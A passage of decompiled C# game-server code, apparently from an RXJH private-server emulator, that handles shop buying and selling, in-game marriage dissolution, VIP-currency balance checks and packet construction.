					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					break;
				case 191:
					打开仓库中 = true;
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 213:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					break;
				case 209:
					打开仓库中 = true;
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				case 243:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(-1992f, 1206f, 15f, 26100);
					break;
				case 238:
					打开仓库中 = true;
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					合成物品表.Clear();
					break;
				default:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
					System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
					break;
				case 305:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					参加攻城战();
					break;
				case 304:
					System.Buffer.BlockCopy(array, 0, array3, 18, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					移动(570f, 1073f, 15f, 101);
					break;
				case 300:
					if (查找范围Npc(186, 30))
					{
						打开仓库中 = true;
						System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
						System.Buffer.BlockCopy(BitConverter.GetBytes(245), 0, array3, 14, 1);
						System.Buffer.BlockCopy(BitConverter.GetBytes(255), 0, array3, 15, 1);
						System.Buffer.BlockCopy(BitConverter.GetBytes(255), 0, array3, 16, 1);
						System.Buffer.BlockCopy(BitConverter.GetBytes(255), 0, array3, 17, 1);
						System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array3, 18, 2);
						合成物品表.Clear();
					}
					else
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes(242), 0, array3, 14, 1);
						System.Buffer.BlockCopy(BitConverter.GetBytes(255), 0, array3, 15, 1);
						System.Buffer.BlockCopy(BitConverter.GetBytes(255), 0, array3, 16, 1);
						System.Buffer.BlockCopy(BitConverter.GetBytes(255), 0, array3, 17, 1);
						System.Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array3, 18, 2);
					}
					break;
				}
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array3, array3.Length);
				}
			}
			catch
			{
			}
		}

		public void 解除男女关系()
		{
			try
			{
				解除关系倒计时 = 0;
				Players players = World.检查玩家name(base.FLD_情侣);
				if (players != null)
				{
					base.FLD_情侣 = "";
					base.FLD_情侣_爱情度 = 0;
					武功新[2, 16] = null;
					武功新[2, 17] = null;
					players.FLD_情侣 = "";
					players.FLD_情侣_爱情度 = 0;
					players.武功新[2, 16] = null;
					players.武功新[2, 17] = null;
					players.解除关系倒计时 = 0;
					players.情侣提示(15, base.FLD_情侣, base.UserName);
					情侣提示(15, base.UserName, base.FLD_情侣);
					players.更新情侣系统(2, base.UserName, string.Empty, players.解除关系倒计时, DateTime.Now);
					更新情侣系统(2, base.FLD_情侣, string.Empty, 解除关系倒计时, DateTime.Now);
					RxjhClass.变更婚姻状态(base.FLD_情侣, 0);
				}
				else
				{
					系统提示("对方不在线离婚错误。");
				}
			}
			catch
			{
			}
		}

		public void 打开商店(byte[] 封包数据, int 封包大小)
		{
			try
			{
				if (base.人物_HP > 0 && !base.Player死亡 && !退出中)
				{
					封包修改(封包数据, 封包大小);
					byte[] array = new byte[2];
					byte[] array2 = new byte[2];
					byte[] array3 = new byte[2];
					System.Buffer.BlockCopy(封包数据, 10, array2, 0, 2);
					System.Buffer.BlockCopy(封包数据, 18, array, 0, 2);
					System.Buffer.BlockCopy(封包数据, 30, array3, 0, 2);
					int 页标_ = BitConverter.ToInt16(array3, 0);
					打开商店(BitConverter.ToInt16(array, 0), BitConverter.ToInt16(array2, 0), 页标_);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "打开商店  出错  [" + base.Userid + "][" + base.UserName + "]  " + ex.Message);
			}
		}

		public void 买卖东西(byte[] 封包数据, int 封包大小)
		{
			int num = 0;
			try
			{
				if (!退出中)
				{
					封包修改(封包数据, 封包大小);
					int num2 = 封包数据[10];
					int num3 = 封包数据[67];
					int num4 = BitConverter.ToInt32(封包数据, 18);
					int num5 = BitConverter.ToInt32(封包数据, 26);
					if (num5 > 0 && num5 <= 9999)
					{
						num = 1;
						if (!退出中)
						{
							byte[] array = new byte[56];
							ItmeClass value;
							if (World.Itme.TryGetValue(num4, out value))
							{
								if (value.FLD_QUESTITEM != 1)
								{
									if (num2 == 1)
									{
										if (num5 >= 1)
										{
											ShopClass shopClass = ShopClass.Getwp(num4);
											if (shopClass != null)
											{
												long num6 = shopClass.FLD_MONEY * num5;
												if (num6 >= 0L)
												{
													if (shopClass.需要武勋 != 0 && base.Player_WuXun < shopClass.需要武勋)
													{
														系统提示("您的武勋不足" + shopClass.需要武勋 + ",无法购买此物品", 50, "");
													}
													else if (base.Player_Money < num6)
													{
														购买物品提示(13);
														系统提示("金钱不足,本次购买物品总额为:" + (double)num6 / 10000.0 + "万。");
													}
													else if (value.FLD_WEIGHT * num5 + base.人物当前负重 >= base.人物负重总)
													{
														购买物品提示(11);
													}
													else
													{
														num = 2;
														bool flag = false;
														int num7 = 得到包裹空位(this);
														if (num7 != -1)
														{
															num = 3;
															int num8 = shopClass.FLD_MAGIC0;
															int fLD_MAGIC = shopClass.FLD_MAGIC1;
															if (num8 == 0)
															{
																switch (num4)
																{
																case 800000011:
																	num4 = 800000001;
																	if (num5 > 1)
																	{
																		if (num5 > 得到包裹空位数())
																		{
																			购买物品提示(14);
																			return;
																		}
																		flag = true;
																		for (int num9 = 0; num9 < num5 - 1; num9++)
																		{
																			int 位置7 = 得到包裹空位(this);
																			int value8 = World.GetValue(num4, 1);
																			增加物品带属性(num4, 位置7, 1, value8, 0, 0, 0, 0, 0, 0, 0, 0, 0);
																		}
																	}
																	num8 = World.GetValue(800000011, 1);
																	break;
																case 800000012:
																	num4 = 800000002;
																	if (num5 > 1)
																	{
																		if (num5 > 得到包裹空位数())
																		{
																			购买物品提示(14);
																			return;
																		}
																		flag = true;
																		for (int m = 0; m < num5 - 1; m++)
																		{
																			int 位置5 = 得到包裹空位(this);
																			int value6 = World.GetValue(num4, 1);
																			增加物品带属性(num4, 位置5, 1, value6, 0, 0, 0, 0, 0, 0, 0, 0, 0);
																		}
																	}
																	num8 = World.GetValue(800000002, 1);
																	break;
																case 800000013:
																	num8 = World.GetValue(800000013, 1);
																	break;
																case 800000002:
																	if (num5 > 1)
																	{
																		if (num5 > 得到包裹空位数())
																		{
																			购买物品提示(14);
																			return;
																		}
																		flag = true;
																		for (int k = 0; k < num5 - 1; k++)
																		{
																			int 位置3 = 得到包裹空位(this);
																			int value4 = World.GetValue(num4, 1);
																			增加物品带属性(num4, 位置3, 1, value4, 0, 0, 0, 0, 0, 0, 0, 0, 0);
																		}
																	}
																	num8 = World.GetValue(800000002, 1);
																	break;
																case 800000001:
																	if (num5 > 1)
																	{
																		if (num5 > 得到包裹空位数())
																		{
																			购买物品提示(14);
																			return;
																		}
																		flag = true;
																		for (int n = 0; n < num5 - 1; n++)
																		{
																			int 位置6 = 得到包裹空位(this);
																			int value7 = World.GetValue(num4, 1);
																			增加物品带属性(num4, 位置6, 1, value7, 0, 0, 0, 0, 0, 0, 0, 0, 0);
																		}
																	}
																	num8 = World.GetValue(800000001, 1);
																	break;
																case 800000061:
																	if (num5 > 1)
																	{
																		if (num5 > 得到包裹空位数())
																		{
																			购买物品提示(14);
																			return;
																		}
																		flag = true;
																		for (int num11 = 0; num11 < num5 - 1; num11++)
																		{
																			int 位置9 = 得到包裹空位(this);
																			int value10 = World.GetValue(num4, 1);
																			增加物品带属性(num4, 位置9, 1, value10, 0, 0, 0, 0, 0, 0, 0, 0, 0);
																		}
																	}
																	num8 = World.GetValue(num4, 1);
																	break;
																case 800000023:
																	if (num5 > 1)
																	{
																		if (num5 > 得到包裹空位数())
																		{
																			购买物品提示(14);
																			return;
																		}
																		flag = true;
																		for (int num12 = 0; num12 < num5 - 1; num12++)
																		{
																			int 位置10 = 得到包裹空位(this);
																			int value11 = World.GetValue(num4, 1);
																			增加物品带属性(num4, 位置10, 1, value11, 0, 0, 0, 0, 0, 0, 0, 0, 0);
																		}
																	}
																	num8 = World.GetValue(800000023, 1);
																	break;
																case 800000024:
																	if (num5 > 1)
																	{
																		if (num5 > 得到包裹空位数())
																		{
																			购买物品提示(14);
																			return;
																		}
																		flag = true;
																		for (int l = 0; l < num5 - 1; l++)
																		{
																			int 位置4 = 得到包裹空位(this);
																			int value5 = World.GetValue(num4, 1);
																			增加物品带属性(num4, 位置4, 1, value5, 0, 0, 0, 0, 0, 0, 0, 0, 0);
																		}
																	}
																	num8 = World.GetValue(800000024, 1);
																	break;
																case 800000025:
																	num4 = 800000001;
																	if (num5 > 1)
																	{
																		if (num5 > 得到包裹空位数())
																		{
																			购买物品提示(14);
																			return;
																		}
																		flag = true;
																		for (int num10 = 0; num10 < num5 - 1; num10++)
																		{
																			int 位置8 = 得到包裹空位(this);
																			int value9 = World.GetValue(num4, 1);
																			增加物品带属性(num4, 位置8, 1, value9, 0, 0, 0, 0, 0, 0, 0, 0, 0);
																		}
																	}
																	num8 = World.GetValue(800000025, 1);
																	break;
																case 800000026:
																	num4 = 800000001;
																	if (num5 > 1)
																	{
																		if (num5 > 得到包裹空位数())
																		{
																			购买物品提示(14);
																			return;
																		}
																		flag = true;
																		for (int j = 0; j < num5 - 1; j++)
																		{
																			int 位置2 = 得到包裹空位(this);
																			int value3 = World.GetValue(num4, 1);
																			增加物品带属性(num4, 位置2, 1, value3, 0, 0, 0, 0, 0, 0, 0, 0, 0);
																		}
																	}
																	num8 = World.GetValue(800000026, 1);
																	break;
																case 800000027:
																	num4 = 800000028;
																	num8 = World.GetValue(800000028, 1);
																	break;
																case 800000034:
																	num4 = 800000030;
																	shopClass.FLD_MAGIC0 = World.GetValue(800000034, 1);
																	break;
																case 800000035:
																	num4 = 800000031;
																	shopClass.FLD_MAGIC0 = World.GetValue(800000035, 1);
																	break;
																case 800000036:
																	num8 = RNG.Next(200005, 200015);
																	break;
																case 800000037:
																	num8 = RNG.Next(200010, 200030);
																	break;
																case 1000000321:
																	shopClass.FLD_MAGIC0 = RNG.Next(0, 1000);
																	shopClass.FLD_MAGIC1 = RNG.Next(10, 20);
																	break;
																case 1000000323:
																	shopClass.FLD_MAGIC0 = RNG.Next(0, 1000);
																	shopClass.FLD_MAGIC1 = RNG.Next(100, 150);
																	break;
																case 1000000325:
																	shopClass.FLD_MAGIC0 = RNG.Next(0, 1000);
																	shopClass.FLD_MAGIC1 = RNG.Next(400, 699);
																	break;
																case 1000000327:
																	shopClass.FLD_MAGIC0 = RNG.Next(0, 1000);
																	shopClass.FLD_MAGIC1 = RNG.Next(2000, 2499);
																	break;
																case 800000062:
																	if ((num4 == 800000001 || num4 == 800000002 || num4 == 800000011 || num4 == 800000012 || num4 == 800000023 || num4 == 800000024 || num4 == 800000025 || num4 == 800000026 || num4 == 800000061 || num4 == 800000062) && num5 > 1)
																	{
																		if (num5 > 得到包裹空位数())
																		{
																			购买物品提示(14);
																			return;
																		}
																		flag = true;
																		for (int i = 0; i < num5 - 1; i++)
																		{
																			int 位置 = 得到包裹空位(this);
																			int value2 = World.GetValue(num4, 1);
																			增加物品带属性(num4, 位置, 1, value2, 0, 0, 0, 0, 0, 0, 0, 0, 0);
																		}
																	}
																	num8 = World.GetValue(num4, 1);
																	break;
																}
															}
															num = 4;
															byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
															System.Buffer.BlockCopy(BitConverter.GetBytes(num8), 0, array, 0, 4);
															System.Buffer.BlockCopy(BitConverter.GetBytes(fLD_MAGIC), 0, array, 4, 4);
															System.Buffer.BlockCopy(BitConverter.GetBytes(shopClass.FLD_MAGIC2), 0, array, 8, 4);
															System.Buffer.BlockCopy(BitConverter.GetBytes(shopClass.FLD_MAGIC3), 0, array, 12, 4);
															System.Buffer.BlockCopy(BitConverter.GetBytes(shopClass.FLD_MAGIC4), 0, array, 16, 4);
															num = 5;
															long num13;
															switch (num4)
															{
															default:
																num13 = ((shopClass.FLD_MONEY != 0L) ? (shopClass.FLD_MONEY * num5) : ((long)value.FLD_SALE_MONEY * (long)num5));
																if (base.人物善恶 <= -1 && base.人物善恶 > -500)
																{
																	num13 += (int)((double)num13 * 0.3);
																}
																else if (base.人物善恶 <= -500 && base.人物善恶 > -5000)
																{
																	num13 += (int)((double)num13 * 0.5);
																}
																else if (base.人物善恶 <= -5000 && base.人物善恶 > -10000)
																{
																	num13 *= 2L;
																}
																else if (base.人物善恶 <= -10000 && base.人物善恶 > -30000)
																{
																	num13 *= 4L;
																}
																else if (base.人物善恶 <= -30000)
																{
																	num13 *= 4L;
																}
																if (num13 < 0L || num13 > 2000000000L)
																{
																	return;
																}
																if (shopClass.需要武勋 != 0)
																{
																	base.Player_WuXun -= shopClass.需要武勋;
																	更新武功和状态();
																	武勋消耗提示(-shopClass.需要武勋);
																}
																if (base.Player_Money < num13)
																{
																	购买物品提示(13);
																	系统提示("金钱不足,本次购买总价为:" + (double)num13 / 10000.0 + "万。");
																	return;
																}
																base.Player_Money -= num13;
																break;
															case 700000002:
																if (base.Player_Money < 100200000L)
																{
																	购买物品提示(13);
																	return;
																}
																num13 = 100200000L;
																base.Player_Money -= 100200000L;
																base.人物当前负重 += value.FLD_WEIGHT * num5;
																break;
															case 700000003:
																if (base.Player_Money < 5010000000L)
																{
																	购买物品提示(13);
																	return;
																}
																num13 = 5050000000L;
																base.Player_Money -= 5050000000L;
																base.人物当前负重 += value.FLD_WEIGHT * num5;
																break;
															case 700000004:
																if (base.Player_Money < 10020000000L)
																{
																	购买物品提示(13);
																	return;
																}
																num13 = 10100000000L;
																base.Player_Money -= 10100000000L;
																base.人物当前负重 += value.FLD_WEIGHT * num5;
																break;
															}
															byte[] bytes2 = BitConverter.GetBytes(num13);
															if (flag)
															{
																num5 = 1;
																num7 = 得到包裹空位(this);
															}
															买卖物品(num7, num2, bytes2, BitConverter.GetBytes(num5), bytes, BitConverter.GetBytes(num4), array);
															RxjhClass.商店记录(base.Userid, base.UserName, num4, value.ItmeNAME, "购买", num5, num13, num8, fLD_MAGIC, shopClass.FLD_MAGIC2, shopClass.FLD_MAGIC3, shopClass.FLD_MAGIC4);
															num = 6;
															goto IL_1086;
														}
														购买物品提示(14);
													}
												}
											}
										}
									}
									else if (num5 >= 1)
									{
										num = 7;
										物品类 物品类 = 装备栏包裹[num3];
										if (!装备栏包裹[num3].物品绑定 && BitConverter.ToInt32(物品类.物品ID, 0) != 0 && BitConverter.ToInt32(物品类.物品数量, 0) != 0)
										{
											if (BitConverter.ToInt32(物品类.物品ID, 0) != num4)
											{
												Form1.WriteLine(6, "买卖东西BUG22  [" + num4 + "][" + base.Userid + "][" + base.UserName + "][" + base.Client.ToString() + "]  ");
											}
											else
											{
												num = 8;
												ItmeClass value12;
												if (World.Itme.TryGetValue(BitConverter.ToInt32(物品类.物品ID, 0), out value12))
												{
													if (value12.FLD_LOCK != 1)
													{
														long num14;
														switch (num4)
														{
														default:
															if (value.FLD_TYPE == 6 || num5 < 1 || BitConverter.ToInt32(物品类.物品ID, 0) != num4 || 物品类.Get物品数量 < num5)
															{
																return;
															}
															num14 = value.FLD_RECYCLE_MONEY * num5;
															if (base.FLD_人物_追加_贩卖价格百分比 <= 0.0)
															{
																base.FLD_人物_追加_贩卖价格百分比 = 0.0;
															}
															else
															{
																num14 = (long)((double)num14 * (1.0 + base.FLD_人物_追加_贩卖价格百分比));
															}
															if (num14 < 0L || num14 > 2000000000L)
															{
																return;
															}
															if (base.Player_Money + num14 > World.最大钱数)
															{
																系统提示("个人随身携带金额上限为[" + World.最大钱数 / 100000000L + "亿]两。");
																return;
															}
															base.Player_Money += num14;
															break;
														case 700000002:
															if (BitConverter.ToInt32(物品类.物品ID, 0) != 700000002 || 物品类.Get物品数量 < num5)
															{
																return;
															}
															num14 = 100000000L;
															if (base.Player_Money + 100000000L > World.最大钱数)
															{
																系统提示("个人随身携带金额上限为[" + World.最大钱数 / 100000000L + "亿]两。");
																return;
															}
															base.Player_Money += num14;
															break;
														case 700000003:
															if (BitConverter.ToInt32(物品类.物品ID, 0) != 700000003 || 物品类.Get物品数量 < num5)
															{
																return;
															}
															num14 = 5000000000L;
															if (base.Player_Money + 5000000000L > World.最大钱数)
															{
																系统提示("个人随身携带金额上限为[" + World.最大钱数 / 100000000L + "亿]两。");
																return;
															}
															base.Player_Money += num14;
															break;
														case 700000004:
															if (BitConverter.ToInt32(物品类.物品ID, 0) != 700000004 || 物品类.Get物品数量 < num5)
															{
																return;
															}
															num14 = 10000000000L;
															if (base.Player_Money + 10000000000L > World.最大钱数)
															{
																系统提示("个人随身携带金额上限为[" + World.最大钱数 / 100000000L + "亿]两。");
																return;
															}
															base.Player_Money += num14;
															break;
														}
														num = 9;
														switch (value.FLD_RESIDE2)
														{
														case 1:
														case 2:
														case 4:
														case 5:
														case 6:
														case 7:
														case 8:
														case 10:
														case 14:
														case 15:
															RxjhClass.商店记录(base.Userid, base.UserName, num4, value.ItmeNAME, "出售", num5, num14, 装备栏包裹[num3].FLD_MAGIC0, 装备栏包裹[num3].FLD_MAGIC1, 装备栏包裹[num3].FLD_MAGIC2, 装备栏包裹[num3].FLD_MAGIC3, 装备栏包裹[num3].FLD_MAGIC4);
															break;
														}
														byte[] bytes3 = BitConverter.GetBytes(num14);
														买卖物品(num3, num2, bytes3, BitConverter.GetBytes(num5), null, BitConverter.GetBytes(num4), array);
														num = 10;
														goto IL_1086;
													}
													系统提示("锁定的物品禁止出售。");
												}
											}
										}
									}
								}
							}
							else
							{
								Form1.WriteLine(1, "买卖东西  出错        没有这个物品  [" + num4 + "][" + num5 + "]");
							}
						}
					}
				}
				goto end_IL_0002;
				IL_1086:
				更新金钱和负重();
				end_IL_0002:;
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "买卖东西  出错  [" + base.Userid + "][" + base.UserName + "]  [" + BitConverter.ToInt32(封包数据, 18) + "]  [" + num + "]  " + ex.Message);
			}
		}

		public void 武勋消耗提示(int 数量)
		{
			byte[] array = Converter.hexStringToByte("AA5516008A02D218080013000000F0D8FFFF000000000000DA1F55AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(数量), 0, array, 14, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array, array.Length);
			}
		}

		public void 买卖物品(int 位置, int 买卖, byte[] 价格, byte[] 物品数量, byte[] 物品全局ID, byte[] 物品ID, byte[] 物品属性)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA558E00470393008000020000000200000065CA9A3B0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000010E020F000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000094B555AA");
				System.Buffer.BlockCopy(BitConverter.GetBytes(买卖), 0, array, 10, 1);
				System.Buffer.BlockCopy(BitConverter.GetBytes(买卖), 0, array, 14, 1);
				System.Buffer.BlockCopy(物品ID, 0, array, 18, 4);
				System.Buffer.BlockCopy(物品数量, 0, array, 26, 4);
				System.Buffer.BlockCopy(价格, 0, array, 34, 8);
				System.Buffer.BlockCopy(物品ID, 0, array, 50, 4);
				System.Buffer.BlockCopy(物品数量, 0, array, 58, 4);
				System.Buffer.BlockCopy(物品属性, 0, array, 74, World.物品属性大小);
				byte[] array2 = new byte[World.数据库单个物品大小];
				uint num = (uint)BitConverter.ToInt32(物品数量, 0);
				ItmeClass value;
				if (num < 1 || !World.Itme.TryGetValue(BitConverter.ToInt32(物品ID, 0), out value))
				{
					return;
				}
				int fLD_SIDE = value.FLD_SIDE;
				if (买卖 == 1)
				{
					if (fLD_SIDE != 0)
					{
						byte[] array3 = new byte[4];
						System.Buffer.BlockCopy(物品属性, 0, array3, 0, 4);
						物品类 物品类 = 得到人物物品类型(BitConverter.ToInt32(物品ID, 0), BitConverter.ToInt32(array3, 0));
						if (物品类 != null)
						{
							位置 = 物品类.物品位置;
							物品数量 = BitConverter.GetBytes(num + BitConverter.ToInt32(物品类.物品数量, 0));
						}
					}
					else
					{
						num = 1u;
						物品数量 = BitConverter.GetBytes(1);
					}
					System.Buffer.BlockCopy(物品全局ID, 0, array, 42, 8);
					System.Buffer.BlockCopy(物品全局ID, 0, array2, 0, 8);
					System.Buffer.BlockCopy(物品ID, 0, array2, 8, 4);
					System.Buffer.BlockCopy(物品属性, 0, array2, 16, 20);
					System.Buffer.BlockCopy(物品数量, 0, array2, 12, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes((int)num), 0, array, 26, 4);
					System.Buffer.BlockCopy(物品数量, 0, array, 57, 4);
					装备栏包裹[位置].物品_byte = array2;
				}
				else
				{
					物品类 物品类2 = 装备栏包裹[位置];
					if (BitConverter.ToInt32(物品类2.物品ID, 0) == 0 || BitConverter.ToInt32(物品类2.物品数量, 0) == 0 || BitConverter.ToInt32(物品类2.物品数量, 0) < num || num < 1)
					{
						return;
					}
					if (fLD_SIDE != 0)
					{
						int num2 = BitConverter.ToInt32(物品类2.物品数量, 0) - (int)num;
						if (num2 <= 0)
						{
							装备栏包裹[位置].物品_byte = new byte[World.数据库单个物品大小];
							System.Buffer.BlockCopy(BitConverter.GetBytes((int)num), 0, array, 26, 4);
							System.Buffer.BlockCopy(BitConverter.GetBytes(num2), 0, array, 58, 4);
						}
						else
						{
							System.Buffer.BlockCopy(物品类2.物品全局ID, 0, array2, 0, 8);
							System.Buffer.BlockCopy(物品类2.物品ID, 0, array2, 8, 4);
							System.Buffer.BlockCopy(物品类2.物品属性, 0, array2, 16, World.物品属性大小);
							System.Buffer.BlockCopy(BitConverter.GetBytes(num2), 0, array2, 12, 4);
							System.Buffer.BlockCopy(物品类2.物品全局ID, 0, array, 42, 8);
							System.Buffer.BlockCopy(BitConverter.GetBytes((int)num), 0, array, 26, 4);
							System.Buffer.BlockCopy(BitConverter.GetBytes(num2), 0, array, 58, 4);
							装备栏包裹[位置].物品_byte = array2;
						}
					}
					else
					{
						装备栏包裹[位置].物品_byte = new byte[World.数据库单个物品大小];
					}
				}
				System.Buffer.BlockCopy(BitConverter.GetBytes(位置), 0, array, 67, 1);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "买卖物品  出错  [" + base.Userid + "][" + base.UserName + "]  " + ex.Message);
			}
			初始化装备篮包裹();
		}

		public void 百宝(byte[] 封包数据, int 封包大小)
		{
			if (元宝合成开关 == 1)
			{
				return;
			}
			byte[] array = new byte[4];
			System.Buffer.BlockCopy(封包数据, 10, array, 0, 1);
			switch (BitConverter.ToInt32(array, 0))
			{
			case 2:
			{
				byte[] array2 = Converter.hexStringToByte("AA5507007100D50001000255AA");
				if (base.Client != null)
				{
					base.Client.Send(array2, array2.Length);
				}
				break;
			}
			case 1:
			{
				发包类 发包类 = new 发包类();
				发包类.Write(1);
				发包类.Write(1);
				发包类.Write2(World.服务器ID);
				发包类.Write2(World.服务器组ID);
				发包类.WriteAsciiFixed(World.百宝阁地址);
				发包类.Write2(0);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 54528, 0);
				}
				break;
			}
			}
		}

		public void 查百宝阁元宝数()
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("select  FLD_SEX,FLD_RXPIONT,FLD_RXPIONTX,FLD_VIP,FLD_VIPTIM,FLD_COIN  from  [TBL_ACCOUNT]  where  FLD_ID=@Userid"), new SqlParameter[1]
			{
				SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, base.Userid)
			}, "rxjhaccount");
			base.FLD_RXPIONT = (int)dBToDataTable.Rows[0]["FLD_RXPIONT"];
			base.FLD_RXPIONTX = (int)dBToDataTable.Rows[0]["FLD_RXPIONTX"];
			base.FLD_Coin = (int)dBToDataTable.Rows[0]["FLD_COIN"];
			if (base.FLD_RXPIONT <= 0)
			{
				base.FLD_RXPIONT = 0;
			}
			if (base.FLD_Coin < 0)
			{
				base.FLD_Coin = 0;
			}
			if (World.元宝检测 == 1 && base.FLD_RXPIONT >= World.帐号总元宝上限)
			{
				Form1.WriteLine(77, "玩家元宝总数超出系统允许上限[" + base.Userid + "]-[" + base.UserName + "]            [元宝总数：" + base.FLD_RXPIONT + "]      [系统允许上限数量：" + World.帐号总元宝上限 + "]");
				switch (World.元宝检测操作)
				{
				case 2:
					封号(72, base.Userid, "元宝总数超出系统允许数量");
					break;
				case 1:
					base.FLD_RXPIONT = 0;
					保存元宝数据();
					break;
				}
			}
			dBToDataTable.Dispose();
		}

		public string 百宝阁买卖东西1(int 物品ID, int 物品数量, long yuanbao, int 类型, int FLD_MAGIC0, int FLD_MAGIC1, int FLD_MAGIC2, int FLD_MAGIC3, int FLD_MAGIC4, int 中级魂, int 觉醒, int 进化, int 绑定, int 使用天数)
		{
			try
			{
				new Random(World.GetRandomSeed());
				百宝阁类 value;
				if (!World.百宝阁属性物品类list.TryGetValue(物品ID, out value))
				{
					return "购买错误4";
				}
				if (value.PID != 物品ID)
				{
					return "重新购买2";
				}
				if (value.TYPE != 类型)
				{
					return "重新购买";
				}
				if (yuanbao >= 100L && 物品数量 == 1 && 物品数量 > 0 && 物品ID != 0 && 使用天数 != 0)
				{
					if (!(使用天数 != 3 && 使用天数 != 7 && 使用天数 != 30) && (FLD_MAGIC2 == 0 || !(FLD_MAGIC2 != 10000100 && FLD_MAGIC2 != 10000200)) && (FLD_MAGIC4 == 0 || !(FLD_MAGIC4 != 80000004 && FLD_MAGIC4 != 80000003)) && (FLD_MAGIC3 == 0 || !(FLD_MAGIC3 != 80001104 && FLD_MAGIC3 != 80001604 && FLD_MAGIC3 != 80001704 && FLD_MAGIC3 != 80001804 && FLD_MAGIC3 != 80001904 && FLD_MAGIC3 != 80002104 && FLD_MAGIC3 != 80002604 && FLD_MAGIC3 != 80002704 && FLD_MAGIC3 != 80002804 && FLD_MAGIC3 != 80002904 && FLD_MAGIC3 != 80003004 && FLD_MAGIC3 != 80003504 && FLD_MAGIC3 != 80003604 && FLD_MAGIC3 != 80003704 && FLD_MAGIC3 != 80003804 && FLD_MAGIC3 != 80003904 && FLD_MAGIC3 != 80004004 && FLD_MAGIC3 != 80004504 && FLD_MAGIC3 != 80004604 && FLD_MAGIC3 != 80004704 && FLD_MAGIC3 != 80004804 && FLD_MAGIC3 != 80004904 && FLD_MAGIC3 != 80005004 && FLD_MAGIC3 != 80005104 && FLD_MAGIC3 != 80005304 && FLD_MAGIC3 != 80005404 && FLD_MAGIC3 != 80005504 && FLD_MAGIC3 != 80005604 && FLD_MAGIC3 != 80005804 && FLD_MAGIC3 != 80007004 && FLD_MAGIC3 != 80007404 && FLD_MAGIC3 != 80007504 && FLD_MAGIC3 != 80007704 && FLD_MAGIC3 != 80007804 && FLD_MAGIC3 != 80007904 && FLD_MAGIC3 != 80006404 && FLD_MAGIC3 != 90000004 && FLD_MAGIC3 != 120000040 && FLD_MAGIC3 != 130000020)) && !(使用天数 == 3 && FLD_MAGIC2 == 0 && FLD_MAGIC3 == 0 && FLD_MAGIC4 == 0 && yuanbao != 100L) && (!(使用天数 == 7 && FLD_MAGIC2 == 0) || !(FLD_MAGIC3 == 0 && FLD_MAGIC4 == 0 && yuanbao != 450L)) && (!(使用天数 == 30 && FLD_MAGIC1 == 0) || !(FLD_MAGIC2 == 0 && FLD_MAGIC3 == 0 && yuanbao != 700L)) && !(使用天数 == 3 && FLD_MAGIC2 != 0 && FLD_MAGIC3 == 0 && FLD_MAGIC4 == 0 && yuanbao != 600L) && (!(使用天数 == 7 && FLD_MAGIC2 != 0 && FLD_MAGIC3 == 0) || !(FLD_MAGIC4 == 0 && yuanbao != 850L)) && (!(使用天数 == 30 && FLD_MAGIC2 != 0 && FLD_MAGIC3 == 0) || !(FLD_MAGIC4 == 0 && yuanbao != 1200L)) && !(使用天数 == 3 && FLD_MAGIC2 == 0 && FLD_MAGIC3 != 0 && FLD_MAGIC4 == 0 && yuanbao != 150L) && !(使用天数 == 7 && FLD_MAGIC2 == 0 && FLD_MAGIC3 != 0 && FLD_MAGIC4 == 0 && yuanbao != 500L) && !(使用天数 == 30 && FLD_MAGIC2 == 0 && FLD_MAGIC3 != 0 && FLD_MAGIC4 == 0 && yuanbao != 750L) && !(使用天数 == 3 && FLD_MAGIC2 == 0 && FLD_MAGIC3 == 0 && 